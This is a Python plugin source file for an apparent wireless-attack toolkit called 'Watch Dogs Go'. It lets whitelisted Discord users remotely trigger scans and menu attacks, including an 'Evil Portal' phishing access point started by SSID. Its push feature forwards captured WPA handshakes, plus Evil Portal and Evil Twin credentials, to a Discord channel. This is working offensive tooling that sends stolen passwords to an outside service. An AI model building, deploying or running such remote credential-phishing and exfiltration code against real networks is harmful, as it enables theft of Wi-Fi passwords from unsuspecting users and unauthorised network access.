"""Discord Remote — manually enabled Discord companion control.

Requires optional dependency:
    python3 -m pip install discord.py

Configuration lives in secrets.conf:
    DISCORD_BOT_TOKEN=...
    DISCORD_CHANNEL_ID=...
    DISCORD_ALLOWED_USERS=123456789,987654321

Commands use a message prefix in the configured channel:
    !wdg status
    !wdg loot
    !wdg tail
    !wdg scan wifi
    !wdg scan bt
    !wdg sdr adsb
    !wdg sdr 433
    !wdg sdr stop
    !wdg stop
    !wdg disable

Push notifications (opt-in, set DISCORD_PUSH_EVENTS=1 in secrets.conf):
    Sends a grouped summary to the channel after each WiFi/BT scan round,
    and an immediate alert for each handshake capture.
"""

from __future__ import annotations

import asyncio
import logging
import queue
import threading
from collections import deque
from dataclasses import dataclass
from pathlib import Path
from typing import Callable

from plugins.plugin_base import PluginBase, PluginMenuItem

log = logging.getLogger(__name__)

# Lazy cache — populated on first !wdg menu call so we don't import the full
# app module at plugin-load time.
_MENU_CATS: list | None = None


def _get_menu_cats() -> list:
    global _MENU_CATS
    if _MENU_CATS is None:
        from watchdogs.app import MENU_CATS
        _MENU_CATS = MENU_CATS
    return _MENU_CATS


PREFIX = "!wdg"
MAX_REPLY = 1800

# Menu items whose cmd requires interactive on-device UI or are WIP.
# These are hidden from !wdg menu listings entirely.
_MENU_REMOTE_SKIP = frozenset({
    "_evil_twin",       # needs scan + target picker
    "_dragon_drain",    # needs scan + target picker
    "_mitm",            # full sub-screen
    "_bd_wip",          # WIP
    "_race_wip",        # WIP
    "_bt_hid_wip",      # WIP
    "_meshcore",        # on-device LoRa chat screen
    "_meshcore_region", # on-device region picker
    "_flipper",         # on-device Flipper Zero screen
    "_watch_connect",   # on-device PipBoy Watch screen
    "_whitelist",       # on-device whitelist manager
})


def _load_secrets_conf() -> dict[str, str]:
    result = {}
    path = Path(__file__).parent.parent / "secrets.conf"
    if not path.is_file():
        return result
    try:
        for line in path.read_text(encoding="utf-8").splitlines():
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            if "=" in line:
                key, _, value = line.partition("=")
                result[key.strip()] = value.strip()
    except OSError:
        pass
    return result


def _parse_ids(value: str) -> set[int]:
    ids: set[int] = set()
    for item in value.replace(" ", "").split(","):
        if not item:
            continue
        try:
            ids.add(int(item))
        except ValueError:
            pass
    return ids


@dataclass
class _RemoteRequest:
    user_id: int
    command: str
    reply: Callable[[str], None]


class DiscordRemote(PluginBase):
    NAME = "Discord Remote"
    VERSION = "0.1"
    AUTHOR = "phutur1st"

    def __init__(self):
        super().__init__()
        self.has_overlay = True
        self._overlay_active = False
        self._menu_sel = 0
        self._log: deque[tuple[str, int]] = deque(maxlen=120)
        self._enabled = False
        self._starting = False
        self._want_running = False
        self._thread: threading.Thread | None = None
        self._requests: queue.Queue[_RemoteRequest] = queue.Queue()
        self._token = ""
        self._channel_id = 0
        self._allowed_users: set[int] = set()
        self._loop = None
        self._client = None
        # push-notification state
        self._push_events = False
        self._push_wifi_seen: set[str] = set()
        self._push_bt_seen: set[str] = set()
        self._push_last_wifi_scan_done = 0.0
        self._push_last_bt_scan_done = 0.0
        self._push_last_hs_count = -1
        self._push_last_terminal_idx = -1  # -1 = unset; baseline on first check
        self._load_config()

    def menu_items(self) -> list[PluginMenuItem]:
        return [
            PluginMenuItem("d", "Discord Remote", "open_overlay"),
        ]

    @property
    def overlay_active(self) -> bool:
        return self._overlay_active

    def on_load(self, app) -> None:
        super().on_load(app)
        self._log.append(("Disabled by default", 13))

    def on_unload(self) -> None:
        self._disable()

    def open_overlay(self):
        self._overlay_active = True
        self._menu_sel = 0
        self._load_config()
        if not self._configured():
            self._log_add("Set token, channel, and allowed users in secrets.conf", 10)
        else:
            self._log_add("Config loaded", 11)

    def on_update(self) -> None:
        self._drain_requests()
        self._check_push_events()
        if not self._overlay_active:
            return
        import pyxel

        if pyxel.btnp(pyxel.KEY_ESCAPE):
            self._overlay_active = False
            if self.app:
                self.app._esc_consumed_frame = pyxel.frame_count
            return

        items = self._overlay_items()
        if pyxel.btnp(pyxel.KEY_UP) and self._menu_sel > 0:
            self._menu_sel -= 1
        if pyxel.btnp(pyxel.KEY_DOWN):
            self._menu_sel = min(self._menu_sel + 1, len(items) - 1)
        if pyxel.btnp(pyxel.KEY_RETURN) and items:
            action = items[min(self._menu_sel, len(items) - 1)][0]
            self._exec(action)

    def draw(self, x: int, y: int, w: int, h: int) -> None:
        if not self._overlay_active:
            return
        import pyxel

        pyxel.rect(0, 0, w, h, 0)
        pyxel.rect(0, 0, w, 12, 1)
        state = "ENABLED" if self._enabled else "DISABLED"
        if self._starting:
            state = "STARTING"
        color = 11 if self._enabled else 10 if self._starting else 8
        pyxel.text(4, 3, "DISCORD REMOTE", 3)
        pyxel.text(w - 80, 3, state, color)

        items = self._overlay_items()
        y0 = 22
        for i, (_action, label) in enumerate(items):
            sel = i == self._menu_sel
            prefix = "\x10" if sel else " "
            pyxel.text(8, y0, f"{prefix} {label}", 7 if sel else 13)
            y0 += 10

        pyxel.line(240, 16, 240, h - 16, 1)
        pyxel.text(248, 20, "-- Remote Log --", 3)
        ly = 34
        max_lines = (h - 50) // 8
        for text, c in list(self._log)[-max_lines:]:
            pyxel.text(248, ly, text[:52], c)
            ly += 8

        push_str = "push:ON" if self._push_events else "push:off"
        pyxel.text(8, h - 34, f"Channel: {self._channel_id or 'not set'}  {push_str}", 13)
        pyxel.text(8, h - 24, f"Allowed users: {len(self._allowed_users)}", 13)
        pyxel.text(8, h - 12, "[ENTER] Execute  [ESC] Back", 13)

    def _overlay_items(self) -> list[tuple[str, str]]:
        if self._enabled or self._starting:
            return [("disable", "Disable Discord Remote")]
        return [("enable", "Enable Discord Remote")]

    def _exec(self, action: str) -> None:
        if action == "enable":
            self._enable()
        elif action == "disable":
            self._disable()

    def _load_config(self) -> None:
        conf = _load_secrets_conf()
        self._token = conf.get("DISCORD_BOT_TOKEN", "")
        try:
            self._channel_id = int(conf.get("DISCORD_CHANNEL_ID", "0") or "0")
        except ValueError:
            self._channel_id = 0
        self._allowed_users = _parse_ids(conf.get("DISCORD_ALLOWED_USERS", ""))
        self._push_events = conf.get("DISCORD_PUSH_EVENTS", "").lower() in ("1", "true", "yes")

    def _configured(self) -> bool:
        return bool(self._token and self._channel_id and self._allowed_users)

    def _enable(self) -> None:
        if self._enabled or self._starting:
            return
        self._load_config()
        if not self._configured():
            self._log_add("Missing Discord config in secrets.conf", 8)
            return
        self._want_running = True
        self._starting = True
        self._push_wifi_seen.clear()
        self._push_bt_seen.clear()
        self._push_last_wifi_scan_done = 0.0
        self._push_last_bt_scan_done = 0.0
        self._push_last_hs_count = -1
        self._push_last_terminal_idx = -1
        self._thread = threading.Thread(
            target=self._discord_worker,
            name="discord-remote",
            daemon=True,
        )
        self._thread.start()
        self._log_add("Starting Discord remote", 10)

    def _disable(self) -> None:
        self._want_running = False
        self._enabled = False
        self._starting = False
        client = self._client
        loop = self._loop
        if client is not None and loop is not None:
            try:
                asyncio.run_coroutine_threadsafe(client.close(), loop)
            except Exception:
                pass
        self._client = None
        self._loop = None
        self._log_add("Discord remote disabled", 10)

    def _discord_worker(self) -> None:
        import time as _time

        try:
            import discord
        except ImportError:
            self._starting = False
            self._log_add("Install optional dependency: discord.py", 8)
            return

        _BACKOFF = [5, 15, 30, 60, 120]
        attempt = 0
        plugin = self

        while plugin._want_running:
            intents = discord.Intents.default()
            intents.message_content = True
            client = discord.Client(intents=intents)
            self._client = client

            @client.event
            async def on_ready():
                nonlocal attempt
                attempt = 0
                plugin._enabled = True
                plugin._starting = False
                plugin._log_add(f"Connected as {client.user}", 11)

            @client.event
            async def on_message(message):
                if message.author.bot:
                    return
                if message.channel.id != plugin._channel_id:
                    return
                if message.author.id not in plugin._allowed_users:
                    plugin._audit(message.author.id, message.content, "rejected")
                    return
                content = message.content.strip()
                if not content.lower().startswith(PREFIX):
                    return
                command = content[len(PREFIX):].strip().lower()
                if not command:
                    await message.channel.send(plugin._help_text())
                    return

                _loop = plugin._loop  # capture at closure creation time
                def reply(text: str, _l=_loop) -> None:
                    text = text[:MAX_REPLY] or "OK"
                    if _l is None:
                        return
                    try:
                        asyncio.run_coroutine_threadsafe(
                            message.channel.send(text), _l)
                    except Exception:
                        pass

                plugin._requests.put(_RemoteRequest(
                    user_id=message.author.id,
                    command=command,
                    reply=reply,
                ))

            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            self._loop = loop
            try:
                loop.run_until_complete(client.start(self._token))
            except Exception as exc:
                self._log_add(f"Discord error: {exc}", 8)
            finally:
                self._enabled = False
                self._client = None
                self._loop = None
                try:
                    loop.close()
                except Exception:
                    pass

            if not plugin._want_running:
                break

            delay = _BACKOFF[min(attempt, len(_BACKOFF) - 1)]
            attempt += 1
            self._starting = True
            self._log_add(f"Reconnecting in {delay}s (attempt {attempt})…", 10)
            deadline = _time.monotonic() + delay
            while _time.monotonic() < deadline:
                if not plugin._want_running:
                    self._starting = False
                    return
                _time.sleep(0.5)

        self._starting = False

    def _push(self, text: str) -> None:
        """Send a proactive (unsolicited) message to the Discord channel."""
        loop = self._loop
        client = self._client
        if not (self._enabled and loop and client):
            return
        channel = client.get_channel(self._channel_id)
        if channel is None:
            return
        try:
            asyncio.run_coroutine_threadsafe(
                channel.send(text[:MAX_REPLY] or "…"), loop)
        except Exception:
            pass

    def _push_chunked(self, header: str, rows: list[str]) -> None:
        """Send header + rows as one or more messages, each ≤ MAX_REPLY chars."""
        fence = "```"
        # overhead per chunk: header\n```\n<rows>\n```
        OVERHEAD = len(fence) * 2 + 4  # two fences + newlines
        CONT_HEADER = "*(cont.)*"
        chunks: list[list[str]] = [[]]
        budget = MAX_REPLY - OVERHEAD - len(header)

        for row in rows:
            needed = len(row) + 1  # +1 for newline
            if budget - needed < 0 and chunks[-1]:
                chunks.append([])
                budget = MAX_REPLY - OVERHEAD - len(CONT_HEADER)
            chunks[-1].append(row)
            budget -= needed

        for i, chunk in enumerate(chunks):
            h = header if i == 0 else CONT_HEADER
            self._push(f"{h}\n{fence}\n" + "\n".join(chunk) + f"\n{fence}")

    def _push_credential(self, tag: str, data: str) -> None:
        label = "Evil Portal" if tag == "EP" else "Evil Twin"
        self._push(f"**[{label}] Credential captured**\n||{data[:400]}||")
        self._log_add(f"Pushed {tag} credential to Discord", 11)

    def _check_push_events(self) -> None:
        if not (self._push_events and self._enabled):
            return
        app = self.app
        if not app:
            return

        wt = getattr(app, "_wifi_scan_done_time", 0.0)
        if wt > 0 and wt != self._push_last_wifi_scan_done:
            self._push_last_wifi_scan_done = wt
            self._push_wifi_batch()

        bt = getattr(app, "_bt_scan_done_time", 0.0)
        if bt > 0 and bt != self._push_last_bt_scan_done:
            self._push_last_bt_scan_done = bt
            self._push_bt_batch()

        hs = getattr(app, "_last_hs_count", 0)
        if self._push_last_hs_count < 0:
            self._push_last_hs_count = hs
        elif hs > self._push_last_hs_count:
            delta = hs - self._push_last_hs_count
            self._push_last_hs_count = hs
            noun = "handshake" if delta == 1 else "handshakes"
            self._push(f"**Handshake captured!** ({delta} new {noun})")

        # Credential lines from terminal — baseline on first check so we
        # don't re-push events that happened before this session connected.
        try:
            with app._term_lock:
                term = list(app.terminal_lines)
        except Exception:
            term = []
        if self._push_last_terminal_idx < 0:
            self._push_last_terminal_idx = len(term)
        else:
            new_lines = term[self._push_last_terminal_idx:]
            self._push_last_terminal_idx = len(term)
            for line in new_lines:
                if "[EP:PWD]" in line:
                    data = line.split("[EP:PWD]", 1)[-1].strip()
                    self._push_credential("EP", data)
                elif "[ET:PWD]" in line:
                    data = line.split("[ET:PWD]", 1)[-1].strip()
                    self._push_credential("ET", data)

    def _push_wifi_batch(self) -> None:
        app = self.app
        if not app:
            return
        nets = [n for n in app.wifi_networks if n.bssid not in self._push_wifi_seen]
        if not nets:
            return
        for n in nets:
            self._push_wifi_seen.add(n.bssid)
        noun = "network" if len(nets) == 1 else "networks"
        header = f"**[WiFi]** {len(nets)} new {noun}"
        rows = [f"  {(n.ssid or '<hidden>'):<18} Ch:{n.channel:<3} {n.rssi}dBm"
                for n in nets]
        self._push_chunked(header, rows)

    def _push_bt_batch(self) -> None:
        app = self.app
        if not app:
            return
        devs = [d for d in app.ble_devices if d.mac not in self._push_bt_seen]
        if not devs:
            return
        for d in devs:
            self._push_bt_seen.add(d.mac)
        noun = "device" if len(devs) == 1 else "devices"
        header = f"**[BT]** {len(devs)} new {noun}"
        rows = [f"  {d.name:<18} {d.rssi}dBm" for d in devs]
        self._push_chunked(header, rows)

    def _drain_requests(self) -> None:
        for _ in range(8):
            try:
                req = self._requests.get_nowait()
            except queue.Empty:
                return
            result = self._handle_remote_command(req.user_id, req.command)
            req.reply(result)

    def _handle_remote_command(self, user_id: int, command: str) -> str:
        self._audit(user_id, command, "accepted")
        parts = command.split()
        head = parts[0] if parts else ""
        if head in ("help", "?"):
            return self._help_text()
        if head == "status":
            return self._status_text()
        if head == "loot":
            return self._loot_text()
        if head == "tail":
            return self._tail_text()
        if head == "scan":
            target = parts[1] if len(parts) > 1 else ""
            return self._scan(target)
        if head == "sdr":
            target = parts[1] if len(parts) > 1 else ""
            return self._sdr(target)
        if head == "menu":
            return self._menu_cmd(parts[1:])
        if head == "sys":
            return self._sys_text()
        if head == "stop":
            return self._stop_all()
        if head == "disable":
            self._disable()
            return "📴 Discord remote disabled — re-enable locally from **PLUGINS**."
        return f"⚠️ Unknown command: `{command}`\n\n{self._help_text()}"

    def _status_text(self) -> str:
        app = self.app
        if not app:
            return "App not ready"
        ops = []
        if getattr(app, "wifi_scanning", False):
            ops.append("wifi wardrive")
        if getattr(app, "ble_scanning", False):
            ops.append("bt wardrive")
        if getattr(app, "_wifi_scan_only", False):
            ops.append("wifi scan")
        if getattr(app, "_ble_scan_only", False):
            ops.append("bt scan")
        if getattr(app.state, "portal_running", False):
            ops.append("evil portal")
        if getattr(app.state, "evil_twin_running", False):
            ops.append("evil twin")
        esp_on = getattr(app, "_esp32", False)
        gps_fix = getattr(app, "gps_fix", False)
        return "\n".join([
            "## Watch Dogs Go",
            f"{'🟢' if esp_on else '🔴'} **ESP32:** {'connected' if esp_on else 'offline'}",
            f"**GPS:** {'fix' if gps_fix else 'no fix'}  `{getattr(app, 'gps_sats', 0)} sats`",
            f"**Level:** {getattr(app, 'level', '?')} — {getattr(app, 'level_title', '')}",
            f"**Running:** {', '.join(ops) if ops else 'idle'}",
        ])

    def _sys_text(self) -> str:
        import os
        import subprocess

        lines = []

        # Uptime
        try:
            with open("/proc/uptime") as f:
                secs = int(float(f.read().split()[0]))
            h, rem = divmod(secs, 3600)
            m = rem // 60
            lines.append(f"Uptime  : {h}h {m}m")
        except Exception:
            pass

        # CPU load (no blocking sleep — use kernel averages)
        try:
            with open("/proc/loadavg") as f:
                l1, l5, l15 = f.read().split()[:3]
            lines.append(f"Load    : {l1} {l5} {l15}  (1/5/15m)")
        except Exception:
            pass

        # CPU temperature
        try:
            with open("/sys/class/thermal/thermal_zone0/temp") as f:
                temp = int(f.read().strip()) / 1000
            lines.append(f"CPU temp: {temp:.1f}°C")
        except Exception:
            pass

        # RAM
        try:
            mem = {}
            with open("/proc/meminfo") as f:
                for line in f:
                    k, v = line.split(":", 1)
                    mem[k.strip()] = int(v.strip().split()[0])
            total = mem["MemTotal"] / 1024 / 1024
            avail = mem["MemAvailable"] / 1024 / 1024
            used = total - avail
            lines.append(f"RAM     : {used:.1f} / {total:.1f} GB")
        except Exception:
            pass

        # Disk (root partition)
        try:
            st = os.statvfs("/")
            total = st.f_blocks * st.f_frsize / 1024 ** 3
            free = st.f_bavail * st.f_frsize / 1024 ** 3
            lines.append(f"Disk    : {free:.1f} / {total:.1f} GB free")
        except Exception:
            pass

        # Battery
        try:
            bat_root = Path("/sys/class/power_supply")
            for entry in sorted(bat_root.iterdir()):
                cap_f = entry / "capacity"
                if cap_f.exists():
                    cap = cap_f.read_text().strip()
                    status_f = entry / "status"
                    status = status_f.read_text().strip().lower() if status_f.exists() else "?"
                    lines.append(f"Battery : {cap}%  ({status})")
                    break
        except Exception:
            pass

        # IP addresses
        try:
            out = subprocess.run(
                ["ip", "-4", "addr", "show"],
                capture_output=True, text=True, timeout=3,
            ).stdout
            iface = None
            addrs = []
            for line in out.splitlines():
                if line and not line[0].isspace():
                    iface = line.split(":")[1].strip().split("@")[0]
                elif "inet " in line and iface and iface != "lo":
                    ip = line.strip().split()[1].split("/")[0]
                    addrs.append(f"{iface} {ip}")
            if addrs:
                lines.append(f"IP      : {', '.join(addrs)}")
        except Exception:
            pass

        if not lines:
            return "⚠️ System info unavailable"
        return "## System\n```\n" + "\n".join(lines) + "\n```"

    def _loot_text(self) -> str:
        app = self.app
        if not app:
            return "App not ready"
        try:
            app._load_loot_totals()
        except Exception:
            pass
        t = getattr(app, "_loot_totals", {})
        passwords = t.get("passwords", 0) + t.get("et_captures", 0)
        return "\n".join([
            "## Loot",
            f"**Sessions:** {t.get('sessions', 0)}",
            f"**WiFi nets:** {t.get('wifi', 0)}",
            f"**BT devices:** {t.get('bt', 0)}",
            f"**Handshakes:** {t.get('pcap', 0)}",
            f"**HC22000:** {t.get('hs', 0)}",
            f"**Credentials:** {passwords}",
        ])

    def _tail_text(self) -> str:
        app = self.app
        if not app:
            return "App not ready"
        try:
            with app._term_lock:
                lines = list(app.terminal_lines[-12:])
        except Exception:
            lines = []
        if not lines:
            return "Terminal is empty"
        try:
            from watchdogs.privacy import mask_line
            lines = [mask_line(line) for line in lines]
        except Exception:
            pass
        body = "\n".join(lines)[-MAX_REPLY:]
        return f"## Terminal\n```\n{body}\n```"

    def _scan(self, target: str) -> str:
        app = self.app
        if not app:
            return "App not ready"
        if app._anything_running_on_esp():
            return "⚠️ Refusing to start scan — another ESP32 operation is running"
        if target == "wifi":
            app._start_scan_cmd("scan_networks", "wifi_scan", "Remote WiFi Scan")
            return "WiFi scan started"
        if target in ("bt", "ble"):
            app._start_scan_cmd("scan_bt", "ble_scan", "Remote BT Scan")
            return "BT scan started"
        return "⚠️ Usage: `!wdg scan wifi` | `!wdg scan bt`"

    def _sdr(self, target: str) -> str:
        app = self.app
        if not app:
            return "App not ready"
        if not getattr(app, "_sdr_enabled", False):
            return "⚠️ SDR is off — enable locally first: **SYSTEM > SDR**"
        if target == "status":
            if not app._sdr.running:
                return "SDR enabled — no receiver running"
            parts = [f"**SDR mode:** `{app._sdr.mode}`"]
            if "adsb" in app._sdr.mode:
                n_pos = sum(1 for a in app._sdr.aircraft.values()
                            if a.has_position)
                parts.append(
                    f"**ADS-B:** {n_pos}/{len(app._sdr.aircraft)} positioned")
            if "433" in app._sdr.mode:
                parts.append(
                    f"**433 MHz:** {app._sdr.total_sensors_seen} sensors seen")
            return "\n".join(parts)
        if target in ("adsb", "ads-b"):
            if app._sdr.running and "adsb" in app._sdr.mode:
                return "ADS-B is already running"
            app._sdr_adsb()
            return "ADS-B receiver started"
        if target in ("433", "433mhz"):
            if app._sdr.running and "433" in app._sdr.mode:
                return "433 MHz scanner is already running"
            app._sdr_433()
            return "433 MHz scanner started"
        if target == "stop":
            if not app._sdr.running:
                return "⚠️ No SDR receiver is running"
            app._sdr.stop()
            app.msg("[Discord] SDR stop", 10)
            app._term_add("[SDR] Remote stop", raw=True)
            return "⛔ SDR receivers stopped"
        return "⚠️ Usage: `!wdg sdr status` | `!wdg sdr adsb` | `!wdg sdr 433` | `!wdg sdr stop`"

    def _stop_all(self) -> str:
        app = self.app
        if not app:
            return "App not ready"
        try:
            app._send("stop")
            app.wifi_scanning = False
            app.ble_scanning = False
            app._wifi_scan_only = False
            app._ble_scan_only = False
            app.sniffing = False
            app.capturing_hs = False
            app.state.portal_running = False
            app.state.evil_twin_running = False
            app.msg("[Discord] Remote stop", 10)
            return "⛔ All operations stopped"
        except Exception as exc:
            return f"🔴 Stop failed: {exc}"

    # ------------------------------------------------------------------
    # Game menu navigation
    # ------------------------------------------------------------------

    def _menu_cmd(self, parts: list[str]) -> str:
        """Handle: !wdg menu [<category> [<number> [args...]]]"""
        MENU_CATS = _get_menu_cats()

        if not parts:
            lines = ["## Watch Dogs Go — Remote Menu", "```"]
            for i, (cat_name, items) in enumerate(MENU_CATS, 1):
                n = sum(1 for it in items if it[2] not in _MENU_REMOTE_SKIP)
                lines.append(f"  {i}.  {cat_name:<12}{n} items")
            lines.append("```")
            lines.append("`!wdg menu <cat>` — list  ·  `!wdg menu <cat> <n>` — run")
            return "\n".join(lines)

        # Resolve category by name prefix or 1-based index
        cat_query = parts[0].upper()
        cat_idx: int | None = None
        for i, (cat_name, _) in enumerate(MENU_CATS):
            if cat_name.startswith(cat_query):
                cat_idx = i
                break
        if cat_idx is None:
            try:
                n = int(parts[0])
                if 1 <= n <= len(MENU_CATS):
                    cat_idx = n - 1
            except ValueError:
                pass
        if cat_idx is None:
            names = ", ".join(c for c, _ in MENU_CATS)
            return f"⚠️ Unknown category `{parts[0]}`. Available: {names}"

        cat_name, items = MENU_CATS[cat_idx]
        visible = [it for it in items if it[2] not in _MENU_REMOTE_SKIP]

        if len(parts) == 1:
            app = self.app
            lines = [f"## {cat_name}", "```"]
            for i, (_hk, name, _cmd, state_key, input_type) in enumerate(visible, 1):
                running = app._is_running(state_key) if app else False
                status = " ●" if running else ""
                arg_hint = f"  <{input_type}>" if input_type else ""
                lines.append(f"  {i}.  {name}{arg_hint}{status}")
            lines.append("```")
            lines.append(f"`!wdg menu {cat_name.lower()} <n>`  ·  add args if shown")
            return "\n".join(lines)

        try:
            item_num = int(parts[1])
        except ValueError:
            return "Item number must be an integer"
        if not (1 <= item_num <= len(visible)):
            return f"Item out of range (1–{len(visible)})"

        _hk, name, cmd, state_key, input_type = visible[item_num - 1]
        return self._remote_menu_exec(cat_name, name, cmd, state_key,
                                      input_type, parts[2:])

    def _remote_menu_exec(self, cat: str, name: str, cmd: str,
                          state_key: str, input_type: str | None,
                          extra: list[str]) -> str:
        app = self.app
        if not app:
            return "App not ready"

        # Items requiring input args
        if input_type and not extra:
            if input_type == "bssid_ch":
                return (f"⚠️ **{name}** requires BSSID and channel\n"
                        f"`!wdg menu {cat.lower()} <n> AA:BB:CC:DD:EE:FF 6`")
            if input_type == "mac":
                return (f"⚠️ **{name}** requires MAC address\n"
                        f"`!wdg menu {cat.lower()} <n> AA:BB:CC:DD:EE:FF`")
            if input_type == "ssid":
                return (f"⚠️ **{name}** requires SSID\n"
                        f"`!wdg menu {cat.lower()} <n> <ssid>`")
            return f"⚠️ **{name}** requires input — `!wdg menu {cat.lower()} <n> <value>`"

        # Build field_values from extra args
        field_values: list[str] = []
        if input_type == "bssid_ch" and len(extra) >= 2:
            field_values = [extra[0], extra[1]]
        elif input_type and extra:
            field_values = [extra[0]]

        # --- Special state_key handlers ---
        if state_key == "_stop_all":
            return self._stop_all()

        if state_key == "_reboot":
            app._send("reboot")
            app.msg("[Discord] Reboot command sent", 10)
            return "Reboot command sent to ESP32"

        if state_key == "_dl_map":
            if app._map_downloading:
                app._map_download_cancel = True
                return "Map download cancellation requested"
            app._start_map_download()
            return "Map download started"

        if state_key == "_gps_toggle":
            app._toggle_gps()
            return f"GPS {'enabled' if app._gps_enabled else 'disabled'}"

        if state_key == "_lora_toggle":
            app._toggle_lora()
            return f"LoRa {'enabled' if app._lora_enabled else 'disabled'}"

        if state_key == "_sdr_toggle":
            app._toggle_sdr()
            return f"SDR {'enabled' if app._sdr_enabled else 'disabled'}"

        if state_key == "_usb_toggle":
            app._toggle_usb()
            return f"USB {'enabled' if app._usb_enabled else 'disabled'}"

        if state_key == "_sdr_adsb":
            return self._sdr("adsb")

        if state_key == "_sdr_433":
            return self._sdr("433")

        if state_key == "_wpasec_up":
            app._wpasec_upload()
            return "WPA-SEC upload initiated"

        if state_key == "_wpasec_dl":
            app._wpasec_download()
            return "WPA-SEC download initiated"

        if state_key == "_flash_esp":
            app._start_flash_esp32()
            return "ESP32 flash initiated — watch on-device display"

        # Evil Portal: send SSID directly
        if cmd == "_evil_portal":
            if not extra:
                return (f"⚠️ **Evil Portal** requires an SSID\n"
                        f"`!wdg menu attack 7 <ssid>`")
            ssid = " ".join(extra)
            if not app._esp32:
                if not app._try_reconnect_esp32():
                    return "⚠️ No ESP32 connected"
            app._portal_ssid = ssid
            app._attack_mode = "evil_portal"
            app._send(f"start_portal {ssid}")
            app.state.portal_running = True
            app.state.portal_ssid = ssid
            app._attack_step = "running"
            app.msg(f"[Discord] Evil Portal: {ssid}", 10)
            return f"**Evil Portal** started — SSID: `{ssid}`"

        # Pure ESP32 commands (no leading underscore)
        if not cmd.startswith("_"):
            if app._anything_running_on_esp():
                return f"⚠️ Refusing to start **{name}** — another ESP32 operation is running"
            if not app._esp32:
                if not app._try_reconnect_esp32():
                    return "⚠️ No ESP32 connected"
            running = app._is_running(state_key)
            if running:
                app._send("stop")
                app._set_running(state_key, False)
                return f"⛔ Stopped: **{name}**"
            final_cmd = (cmd + " " + " ".join(v for v in field_values if v)
                         if field_values else cmd)
            app._start_scan_cmd(final_cmd, state_key, name)
            return f"Started: **{name}**"

        return f"⚠️ `{name}` cannot be triggered remotely"

    def _help_text(self) -> str:
        push_note = ("Push events: **ON** — WiFi/BT batches · HS alerts · credential captures"
                     if self._push_events
                     else "Push events: **off** *(set `DISCORD_PUSH_EVENTS=1` in secrets.conf to enable)*")
        return "\n".join([
            "## Watch Dogs Go Remote",
            "**Info**",
            "`!wdg status`  `!wdg sys`  `!wdg loot`  `!wdg tail`",
            "",
            "**Scanning**",
            "`!wdg scan wifi`  `!wdg scan bt`",
            "",
            "**SDR**",
            "`!wdg sdr status`  `!wdg sdr adsb`  `!wdg sdr 433`  `!wdg sdr stop`",
            "",
            "**Menu**",
            "`!wdg menu`  `!wdg menu <cat>`  `!wdg menu <cat> <n> [args]`",
            "",
            "**Control**",
            "`!wdg stop`  `!wdg disable`",
            "",
            push_note,
        ])

    def _audit(self, user_id: int, command: str, result: str) -> None:
        line = f"user={user_id} result={result} cmd={command}"
        self._log_add(line, 13)
        if self.app and getattr(self.app, "loot", None):
            try:
                self.app.loot.log_attack_event(f"DISCORD_REMOTE: {line}")
            except Exception:
                pass

    def _log_add(self, text: str, color: int = 13) -> None:
        self._log.append((text, color))
        if self.app and hasattr(self.app, "_term_lock"):
            self.app._term_add(f"[Discord] {text}", raw=True)
